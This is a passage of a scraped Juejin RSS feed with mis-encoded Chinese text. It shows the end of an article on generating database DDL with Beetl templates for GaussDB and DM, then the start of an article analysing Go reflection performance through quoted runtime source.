        <span class="hljs-comment">// ä»…æ‰“å° create table ddl</span>
        System.out.println(r2);
    }

    <span class="hljs-keyword">public</span> GroupTemplate <span class="hljs-title function_">getGroupTemplate</span><span class="hljs-params">(String database)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">ClasspathResourceLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClasspathResourceLoader</span>();
            <span class="hljs-type">Configuration</span> <span class="hljs-variable">conf</span> <span class="hljs-operator">=</span> Configuration.defaultConfiguration();
            System.out.println(conf.getTagMap());
            <span class="hljs-type">GroupTemplate</span> <span class="hljs-variable">gt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GroupTemplate</span>(loader, conf);

            Map&lt;String, Object&gt; shareVars = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
            shareVars.put(<span class="hljs-string">"StringEnum"</span>, TypeEnum.STRING);
            shareVars.put(<span class="hljs-string">"NumberEnum"</span>, TypeEnum.NUMBER);
            shareVars.put(<span class="hljs-string">"ClobEnum"</span>, TypeEnum.CLOB);
            shareVars.put(<span class="hljs-string">"DateEnum"</span>, TypeEnum.DATE);
            shareVars.put(<span class="hljs-string">"CURRENT_DATE"</span>, DefaultEnum.CURRENT_DATE);
            shareVars.put(<span class="hljs-string">"SYS_ID"</span>, DefaultEnum.SYS_ID);
            shareVars.put(<span class="hljs-string">"NONE"</span>, DefaultEnum.NONE);
            shareVars.put(<span class="hljs-string">"FIX_VALUE"</span>, DefaultEnum.FIX_VALUE);
            shareVars.put(<span class="hljs-string">"database"</span>, database);

            gt.setSharedVars(shareVars);
            <span class="hljs-keyword">return</span> gt;
        } <span class="hljs-keyword">catch</span> (IOException e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);
        }
    }
}
</code></pre>
<h3 data-id="heading-13">beetlæ¨¡æ¿</h3>
<pre><code class="hljs language-shell" lang="shell">â”œâ”€beetl
    â”œâ”€base                           
        â”œâ”€add_column.btl
        â”œâ”€check_ds.btl
        â”œâ”€check_table_column.btl
        â””â”€create_table.btl
    â”œâ”€gaussdb
        â”œâ”€check_ds.btl
        â”œâ”€check_table_column.btl
        â”œâ”€create_column.btl
        â””â”€tablespace.btl
    â””â”€dm
        â”œâ”€check_ds.btl
        â”œâ”€check_table_column.btl
        â”œâ”€create_column.btl
        â””â”€tablespace.btl
</code></pre>
<h4 data-id="heading-14">baseç›®å½•</h4>
<p>å®šä¹‰é€šç”¨è„šæœ¬æ ¼å¼ï¼Œå°†æ•°æ®åº“å·®å¼‚éƒ¨åˆ†äº¤ç”±å¯¹åº”æ•°æ®åº“ä¸‹çš„è„šæœ¬æ‰§è¡Œã€‚åˆ©ç”¨beetlä¸­çš„ <code>include</code> æ ‡ç­¾å®ç°ã€‚</p>
<p>base/check_ds.btl æ£€æŸ¥åŸºç¡€ç¯å¢ƒã€‚</p>
<p>å¯æ ¹æ®åŸºå»ºæƒ…å†µè‡ªå®šä¹‰ï¼Œå¦‚æ•°æ®åº“åã€ç”¨æˆ·åã€å¯¹åº”çš„tablespaceæ˜¯å¦å­˜åœ¨ç­‰ç­‰ã€‚</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">ä½¿ç”¨includeæ ‡ç­¾å°†ç”±å¯¹åº”æ•°æ®åº“å®ç°</span>
&lt;% include("../" + database + "/check_ds.btl"){} %&gt;
</code></pre>
<p>base/check_table_column.btl æ£€æŸ¥è¡¨å’Œåˆ—æ˜¯å¦å·²ç»å­˜åœ¨</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">ä½¿ç”¨includeæ ‡ç­¾å°†ç”±å¯¹åº”æ•°æ®åº“å®ç°</span>
&lt;% include("../" + database + "/check_table_column.btl"){} %&gt;
</code></pre>
<p>base/create_table.btl åŸºç¡€å»ºè¡¨è¯­å¥</p>
<pre><code class="hljs language-shell" lang="shell">&lt;%
for(table in tables) {
<span class="hljs-meta prompt_">%</span><span class="bash">&gt;</span>
create table ${table.database}.${table.tableName} (
    &lt;%
    for(column in table.columns) {
        var end ="";
        if(!columnLP.last){
            end = ",";
        }
        # åˆ—ä¿¡æ¯å·®å¼‚äº¤ç”±å„è‡ªæ•°æ®åº“çš„ create_column.btl æ¨¡æ¿å®ç°
        include("../" + database + "/create_column.btl",{column:column,end:end}){}
    }
    %&gt;
) &lt;% include("../" + database + "/tablespace.btl",{table:table}){} %&gt;;

COMMENT ON TABLE ${table.database}.${table.tableName} IS '${table.comment}';
    &lt;%
    for(column in table.columns) {
    %&gt;
COMMENT ON COLUMN ${table.database}.${table.tableName}.${column.name} IS '${column.comment}';
    &lt;%
    }
    %&gt;
&lt;%
}
<span class="hljs-meta prompt_">%</span><span class="bash">&gt;</span>
</code></pre>
<h4 data-id="heading-15">gaussDB ç›®å½•</h4>
<p>gaussdb/check_ds.btl</p>
<pre><code class="hljs language-shell" lang="shell">SELECT user FROM dual;test_user;check failed. user must be test_user
select spcname from pg_tablespace where spcname='test_user_ts';test_user_ts;check failed. cannot find tablespace test_user_ts
</code></pre>
<p>gaussdb/check_table_column.btl</p>
<pre><code class="hljs language-shell" lang="shell">select table_name,column_name from information_schema.columns where table_schema='test_user' and table_name in  (
&lt;% for(table in tables) {  %&gt;
    '${table.tableName}'&lt;% if(!tableLP.last) {%&gt;,&lt;% } %&gt;
&lt;% } %&gt;
)
</code></pre>
<p>gaussdb/create_column.btl</p>
<pre><code class="hljs language-shell" lang="shell">&lt;% if(column.type == StringEnum ){ %&gt;
    ${column.name}  VARCHAR2(${column.length}) &lt;% if(column.defaultValueEnum == FIX_VALUE){ %&gt;default '${column.defaultValue}'&lt;% } %&gt; &lt;% if(column.defaultValueEnum == SYS_ID){ %&gt;default sys_guid()&lt;% } %&gt; ${end}
&lt;% } else if (column.type == NumberEnum) { %&gt;
    ${column.name}  NUMBER(${column.precision},${column.scale}) &lt;% if(column.defaultValueEnum == FIX_VALUE){ %&gt;default ${column.defaultValue}&lt;% } %&gt; ${end}
&lt;% } else if (column.type == ClobEnum) { %&gt;
    ${column.name}  CLOB ${end}
&lt;% } else if (column.type == DateEnum) { %&gt;
    ${column.name}  DATE &lt;% if(column.defaultValueEnum == CURRENT_DATE){ %&gt;default sysdate&lt;% } %&gt; ${end}
&lt;% } %&gt;
</code></pre>
<p>gaussdb/tablespace.btl</p>
<pre><code class="hljs language-shell" lang="shell"> tablespace ${table.tablespace}
</code></pre>
<blockquote>
<p>å¦‚æœè§‰å¾—å¯¹æ‚¨æœ‰å¸®åŠ©ï¼Œè¯·ä¸€é”®ä¸‰è¿ï¼šç‚¹èµã€æ”¶è—ã€åŠ å…³æ³¨ï¼Œæ„Ÿè°¢æ‚¨çš„æ”¯æŒã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Goåå°„ï¼šæ€§èƒ½ç“¶é¢ˆä¸é›¶æ‹·è´ä¼˜åŒ–]]></title>    <link>https://juejin.cn/post/7600990891218747401</link>    <guid>https://juejin.cn/post/7600990891218747401</guid>    <pubDate>2026-01-30T14:06:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600990891218747401" data-draft-id="7600787795478151214" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Goåå°„ï¼šæ€§èƒ½ç“¶é¢ˆä¸é›¶æ‹·è´ä¼˜åŒ–"/> <meta itemprop="keywords" content="Go,æ€§èƒ½ä¼˜åŒ–"/> <meta itemprop="datePublished" content="2026-01-30T14:06:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Fgaoxing"/> <meta itemprop="url" content="https://juejin.cn/user/1016425732902296"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Goåå°„ï¼šæ€§èƒ½ç“¶é¢ˆä¸é›¶æ‹·è´ä¼˜åŒ–
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1016425732902296/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Fgaoxing
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T14:06:14.000Z" title="Fri Jan 30 2026 14:06:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>åŸæ–‡ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.yt-blog.top%2F38912%2F" target="_blank" title="https://www.yt-blog.top/38912/" ref="nofollow noopener noreferrer">www.yt-blog.top/38912/</a></p>
</blockquote>
<p>åšGoå¼€å‘çš„ï¼Œè‚¯å®šå°‘ä¸äº†ç”¨åå°„â€”â€”è§£æTagã€æ‹¿å­—æ®µåç§»ã€è·å–ç±»å‹ä¿¡æ¯ï¼ŒORMã€åºåˆ—åŒ–ã€é…ç½®ç»‘å®šè¿™äº›åœ°æ–¹éƒ½è¦ç”¨åˆ°ã€‚</p>
<p>ä½†æ˜¯å®˜æ–¹çš„<code>reflect</code>åŒ…æ€§èƒ½çœŸçš„ä¸å¤ªè¡Œï¼Œè§£æä¸€ä¸ªå­—æ®µæˆ–Tagè¦èŠ±å‡ ååˆ°å‡ ç™¾ä¸‡çº³ç§’ï¼Œè°ƒå¾—å¤šäº†ï¼Œç›´æ¥æˆæ€§èƒ½ç“¶é¢ˆã€‚</p>
<p>å¾ˆå¤šäººåªçŸ¥é“ã€Œåå°„æ…¢ã€ï¼Œä½†ä¸çŸ¥é“æ…¢åœ¨å“ªã€‚å’±ä»¬ä»Šå¤©å°±ä»<code>runtime</code>å±‚é¢åˆ†æä¸€ä¸‹ï¼Œé¡ºä¾¿æä¸ªé›¶æ‹·è´çš„ä¼˜åŒ–æ–¹æ¡ˆã€‚</p>
<h2 data-id="heading-0">ä¸€ã€å…ˆä»åº•å±‚è¯´èµ·</h2>
<p>è¦ææ¸…æ¥šåå°„çš„æ€§èƒ½é—®é¢˜ï¼Œå¾—å…ˆçŸ¥é“Goåº•å±‚æ˜¯æ€ä¹ˆå›äº‹ã€‚</p>
<p>ä»Go1.14å¼€å§‹ï¼Œ<code>runtime</code>é‡Œå‡ ä¸ªæ ¸å¿ƒç±»å‹çš„å†…å­˜å¸ƒå±€å°±æ²¡å˜è¿‡ã€‚è¿™æ˜¯ä¸ªå…³é”®ç‚¹ã€‚</p>
<p>Goçš„åå°„åŒ…å°±æ˜¯åŸºäº<code>runtime</code>å±‚çš„<code>abi</code>å®ç°çš„ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgolang%2Fgo%2Fblob%2Fmaster%2Fsrc%2Freflect%2Ftype.go" target="_blank" title="https://github.com/golang/go/blob/master/src/reflect/type.go" ref="nofollow noopener noreferrer">reflect/type.go</a></p>
<pre><code class="hljs language-go" lang="go">
<span class="hljs-comment">// TypeOf returns the reflection [Type] that represents the dynamic type of i.</span>

<span class="hljs-comment">// If i is a nil interface value, TypeOf returns nil.</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TypeOf</span><span class="hljs-params">(i any)</span></span> Type {

<span class="hljs-keyword">return</span> toType(abi.TypeOf(i))

}

</code></pre>
<p>å…¶å®<code>reflect.Type</code>å°±æ˜¯ä¸€ä¸ªæ¥å£ï¼Œä¸Šé¢ä»£ç é‡Œçš„<code>toType()</code>æŠŠå®ƒè½¬æˆäº†<code>reflect.rtype</code>ã€‚</p>
<pre><code class="hljs language-go" lang="go">
<span class="hljs-comment">// rtype is the common implementation of most values.</span>

<span class="hljs-comment">// It is embedded in other struct types.</span>

<span class="hljs-keyword">type</span> rtype <span class="hljs-keyword">struct</span> {

t abi.Type

}

  


<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">toRType</span><span class="hljs-params">(t *abi.Type)</span></span> *rtype {

<span class="hljs-keyword">return</span> (*rtype)(unsafe.Pointer(t))

}

</code></pre>
<p>æ‰€ä»¥æœ€åæ‹¿åˆ°çš„æ˜¯ä¸ª<code>abi.Type</code>å®ä¾‹ï¼Œ<code>reflect.rtype</code>åªæ˜¯ç»™å®ƒåŒ…äº†ä¸€å±‚ï¼Œæä¾›ä¸ªå‹å¥½çš„æ¥å£ã€‚ä¹Ÿå¯ä»¥æ¢æˆåˆ«çš„ç±»å‹ä¸“ç”¨ç»“æ„ä½“ï¼Œä½†æœ¬è´¨ä¸Šéƒ½æ˜¯å¯¹<code>abi.Type</code>çš„å°è£…ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgolang%2Fgo%2Fblob%2Fmaster%2Fsrc%2Finternal%2Fabi%2Ftype.go" target="_blank" title="https://github.com/golang/go/blob/master/src/internal/abi/type.go" ref="nofollow noopener noreferrer">internal/abi/type.go</a></p>
<pre><code class="hljs language-go" lang="go">
<span class="hljs-comment">// Type is the runtime representation of a Go type.</span>

<span class="hljs-comment">//</span>

<span class="hljs-comment">// Be careful about accessing this type at build time, as the version</span>

<span class="hljs-comment">// of this type in the compiler/linker may not have the same layout</span>

<span class="hljs-comment">// as the version in the target binary, due to pointer width</span>

<span class="hljs-comment">// differences and any experiments. Use cmd/compile/internal/rttype</span>

<span class="hljs-comment">// or the functions in compiletype.go to access this type instead.</span>

<span class="hljs-comment">// (<span class="hljs-doctag">TODO:</span> this admonition applies to every type in this package.</span>

<span class="hljs-comment">// Put it in some shared location?)</span>

<span class="hljs-keyword">type</span> Type <span class="hljs-keyword">struct</span> {

Size_ <span class="hljs-type">uintptr</span>

PtrBytes <span class="hljs-type">uintptr</span> <span class="hljs-comment">// number of (prefix) bytes in the type that can contain pointers</span>

Hash <span class="hljs-type">uint32</span> <span class="hljs-comment">// hash of type; avoids computation in hash tables</span>

TFlag TFlag <span class="hljs-comment">// extra type information flags</span>

Align_ <span class="hljs-type">uint8</span> <span class="hljs-comment">// alignment of variable with this type</span>

FieldAlign_ <span class="hljs-type">uint8</span> <span class="hljs-comment">// alignment of struct field with this type</span>

Kind_ Kind <span class="hljs-comment">// enumeration for C</span>

<span class="hljs-comment">// function for comparing objects of this type</span>

<span class="hljs-comment">// (ptr to object A, ptr to object B) -&gt; ==?</span>

Equal <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(unsafe.Pointer, unsafe.Pointer)</span></span> <span class="hljs-type">bool</span>

<span class="hljs-comment">// GCData stores the GC type data for the garbage collector.</span>

<span class="hljs-comment">// Normally, GCData points to a bitmask that describes the</span>

<span class="hljs-comment">// ptr/nonptr fields of the type. The bitmask will have at</span>

<span class="hljs-comment">// least PtrBytes/ptrSize bits.</span>

<span class="hljs-comment">// If the TFlagGCMaskOnDemand bit is set, GCData is instead a</span>

<span class="hljs-comment">// **byte and the pointer to the bitmask is one dereference away.</span>

<span class="hljs-comment">// The runtime will build the bitmask if needed.</span>

<span class="hljs-comment">// (See runtime/type.go:getGCMask.)</span>

<span class="hljs-comment">// Note: multiple types may have the same value of GCData,</span>

<span class="hljs-comment">// including when TFlagGCMaskOnDemand is set. The types will, of course,</span>

<span class="hljs-comment">// have the same pointer layout (but not necessarily the same size).</span>

GCData *<span class="hljs-type">byte</span>

Str NameOff <span class="hljs-comment">// string form</span>

PtrToThis TypeOff <span class="hljs-comment">// type for pointer to this type, may be zero</span>

}

</code></pre>
<p>å½“ç„¶å®é™…ä¸Šç»“æ„ä½“æ•°æ®æ˜¯å¦‚ä¸Šç»“æ„ä½“çš„æ‰©å±•ï¼ŒåŒæ ·å®šä¹‰åœ¨ä¸€èµ·ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgolang%2Fgo%2Fblob%2Fmaster%2Fsrc%2Finternal%2Fabi%2Ftype.go" target="_blank" title="https://github.com/golang/go/blob/master/src/internal/abi/type.go" ref="nofollow noopener noreferrer">internal/abi/type.go</a></p>
<pre><code class="hljs language-go" lang="go">
<span class="hljs-keyword">type</span> StructField <span class="hljs-keyword">struct</span> {

Name Name <span class="hljs-comment">// name is always non-empty</span>

Typ *Type <span class="hljs-comment">// type of field</span>

Offset <span class="hljs-type">uintptr</span> <span class="hljs-comment">// byte offset of field</span>

}

  


<span class="hljs-keyword">type</span> StructType <span class="hljs-keyword">struct</span> {

Type

PkgPath Name

Fields []StructField

}

</code></pre>
<p>è¿˜æœ‰ä¸€ç‚¹ï¼Œè¿™äº›åº•å±‚ç±»å‹é‡Œå­˜çš„ç»“æ„ä½“å…ƒæ•°æ®ï¼Œæ˜¯ç¼–è¯‘å™¨ç¼–è¯‘æ—¶å°±å†™è¿›ç¨‹åºçš„<strong>åªè¯»å†…å­˜åŒº</strong>äº†ï¼Œ<strong>åœ°å€å›ºå®šã€GCä¸å›æ”¶ã€è¿è¡Œæ—¶ä¸èƒ½æ”¹</strong>ã€‚è¿™ç»™ç›´æ¥æ“ä½œåº•å±‚å†…å­˜æä¾›äº†å®‰å…¨ä¿éšœã€‚</p>
<p>æ—¢ç„¶è¿™æ ·ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<strong>å›ºå®šåç§»é‡</strong>ç²¾ç¡®æ‰¾åˆ°ç›®æ ‡å­—æ®µï¼Œä¸ç”¨å®Œæ•´è§£ææ•´ä¸ªåº•å±‚ç»“æ„ä½“ï¼Œåªè¦å®šä¹‰å‡ ä¸ªç©ºçš„é•œåƒç±»å‹æ¥åšç±»å‹æ ‡æ³¨å°±å¤Ÿäº†ã€‚</p>
<h2 data-id="heading-1">äºŒã€æ€§èƒ½ç“¶é¢ˆåœ¨å“ªå„¿</h2>
<p><code>reflect.TypeOf()</code>åº•å±‚å°±æ˜¯åšä¸ªæŒ‡é’ˆè½¬æ¢ï¼Œä¸æ‹·è´ä¸è®¡ç®—ï¼ŒæŒºå¿«çš„ã€‚çœŸæ­£çš„æ€§èƒ½æŸè€—å‡ºåœ¨åé¢ä¸¤ä¸ªé˜¶æ®µï¼Œè€Œä¸”å› ä¸ºæ²¡ç¼“å­˜ï¼ŒæŸè€—è¢«æ”¾å¤§äº†å¥½å‡ å€ã€‚</p>
<h3 data-id="heading-2">2.1 Fieldæ–¹æ³•åšäº†æ— æ„ä¹‰çš„å†…å­˜åˆ†é…</h3>
<p>è°ƒç”¨<code>reflect.Type.Field(i)</code>çš„æ—¶å€™ï¼Œ<code>rtype</code>ä¼šè¢«è½¬æˆ<code>*StructType</code>ï¼Œç„¶åä»<code>Fields</code>å­—æ®µé‡Œè¯»ç›®æ ‡å­—æ®µä¿¡æ¯ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgolang%2Fgo%2Fblob%2Fmaster%2Fsrc%2Freflect%2Ftype.go" target="_blank" title="https://github.com/golang/go/blob/master/src/reflect/type.go" ref="nofollow noopener noreferrer">reflect/type.go</a></p>
<pre><code class="hljs language-go" lang="go">
<span class="hljs-comment">// Struct field</span>

<span class="hljs-keyword">type</span> structField = abi.StructField <span class="hljs-comment">// æ³¨æ„ï¼šä½ å¹³æ—¶ç”¨çš„æ˜¯ reflect.structFieldï¼Œä¸æ˜¯reflect.StructField</span>

  


<span class="hljs-comment">// structType represents a struct type.</span>

<span class="hljs-keyword">type</span> structType <span class="hljs-keyword">struct</span> {

abi.StructType

}

  


<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(t *rtype)</span></span> Field(i <span class="hljs-type">int</span>) StructField {

<span class="hljs-keyword">if</span> t.Kind() != Struct {

<span class="hljs-built_in">panic</span>(<span class="hljs-string">"reflect: Field of non-struct type "</span> + t.String())

}

tt := (*structType)(unsafe.Pointer(t))

<span class="hljs-keyword">return</span> tt.Field(i)

}

  


<span class="hljs-comment">// Field returns the i'th struct field.</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(t *structType)</span></span> Field(i <span class="hljs-type">int</span>) (f StructField) {

<span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">0</span> || i &gt;= <span class="hljs-built_in">len</span>(t.Fields) {

<span class="hljs-built_in">panic</span>(<span class="hljs-string">"reflect: Field index out of bounds"</span>)

}

p := &amp;t.Fields[i]

f.Type = toType(p.Typ)

f.Name = p.Name.Name()

f.Anonymous = p.Embedded()

<span class="hljs-keyword">if</span> !p.Name.IsExported() {

f.PkgPath = t.PkgPath.Name()

}

<span class="hljs-keyword">if</span> tag := p.Name.Tag(); tag != <span class="hljs-string">""</span> {

f.Tag = StructTag(tag)

}

f.Offset = p.Offset

  


<span class="hljs-comment">// We can't safely use this optimization on js or wasi,</span>

<span class="hljs-comment">// which do not appear to support read-only data.</span>

<span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">256</span> &amp;&amp; runtime.GOOS != <span class="hljs-string">"js"</span> &amp;&amp; runtime.GOOS != <span class="hljs-string">"wasip1"</span> {

staticuint64s := getStaticuint64s()

p := unsafe.Pointer(&amp;(*staticuint64s)[i])

<span class="hljs-keyword">if</span> unsafe.Sizeof(<span class="hljs-type">int</span>(<span class="hljs-number">0</span>)) == <span class="hljs-number">4</span> &amp;&amp; goarch.BigEndian {

p = unsafe.Add(p, <span class="hljs-number">4</span>)

}

f.Index = unsafe.Slice((*<span class="hljs-type">int</span>)(p), <span class="hljs-number">1</span>)

} <span class="hljs-keyword">else</span> {

<span class="hljs-comment">// NOTE(rsc): This is the only allocation in the interface</span>

<span class="hljs-comment">// presented by a reflect.Type. It would be nice to avoid,</span>

<span class="hljs-comment">// but we need to make sure that misbehaving clients of</span>

<span class="hljs-comment">// reflect cannot affect other uses of reflect.</span>

<span class="hljs-comment">// One possibility is CL 5371098, but we postponed that</span>

<span class="hljs-comment">// ugliness until there is a demonstrated</span>

<span class="hljs-comment">// need for the performance. This is issue 2320.</span>

f.Index = []<span class="hljs-type">int</span>{i}

}

<span class="hljs-keyword">return</span>

}

</code></pre>
<p>ä¸Šé¢è¿™æ®µä»£ç é—®é¢˜åœ¨å“ªå„¿å‘¢ï¼Ÿçœ‹<code>f.Index = []int{i}</code>è¿™ä¸€è¡Œã€‚è¿™é‡Œæ— æ„ä¹‰åœ°åˆ›å»ºäº†ä¸€ä¸ªåˆ—è¡¨ï¼Œå®é™…ä¸Šè¿™ä¸ªæ•°æ®å°±æ˜¯ä½ è‡ªå·±ä¼ è¿›å»çš„<code>i</code>ï¼Œå®Œå…¨æ²¡å¿…è¦ã€‚è¿™æ­¥æ“ä½œçº¯ç²¹æ˜¯ä¸ºäº†å…¼å®¹æ€§ã€‚</p>
<p>å…·ä½“è®¨è®ºå¯ä»¥çœ‹<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgolang%2Fgo%2Fissues%2F68380" target="_blank" title="https://github.com/golang/go/issues/68380" ref="nofollow noopener noreferrer">golang/go Â· Issue#68380</a>ã€‚</p>
<h3 data-id="heading-3">2.2 Tagè·å–æ—¶çš„å­—ç¬¦ä¸²æ‹·è´</h3>
<p>åˆšæ‰è¯´çš„è·å–å­—æ®µçš„æ—¶å€™ï¼Œ<code>StructField</code>çš„<code>Tag</code>å­—æ®µæ˜¯<code>StructTag</code>ç±»å‹ï¼Œå…¶å®å°±æ˜¯ä¸ª<code>string</code>ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgolang%2Fgo%2Fblob%2Fmaster%2Fsrc%2Freflect%2Ftype.go" target="_blank" title="https://github.com/golang/go/blob/master/src/reflect/type.go" ref="nofollow noopener noreferrer">reflect/type.go</a></p>
